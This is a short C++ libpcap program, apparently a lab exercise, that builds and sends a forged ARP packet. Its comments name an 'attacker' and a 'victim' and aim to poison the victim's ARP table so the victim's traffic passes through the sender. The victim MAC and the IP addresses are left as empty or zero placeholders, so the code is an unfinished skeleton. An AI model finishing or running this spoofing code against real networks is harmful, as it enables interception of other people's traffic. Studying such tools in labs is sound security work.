#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <cstring>
#include "ethhdr.h"
#include "arphdr.h"
#include "get_mac.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;
	string interface = dev;

	//get my(attacker)'s mac address
	string myMac = get_mac(interface); 

	string vicMac;

	packet.eth_.smac_ = Mac(myMac);
	packet.eth_.dmac_ = Mac(vicMac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.op_ = htons(ArpHdr::Request);
	//My mac
	packet.arp_.smac_ = Mac(myMac);
	//target ip(gateway)
	packet.arp_.sip_ = htonl(Ip("0.0.0.0"));
	
	//Victim
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip("0.0.0.0")); 

	/*
	result

	victim's arp table
	myMac:targetIP

	if victim connet to externel, that packet is visible to me
	*/

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
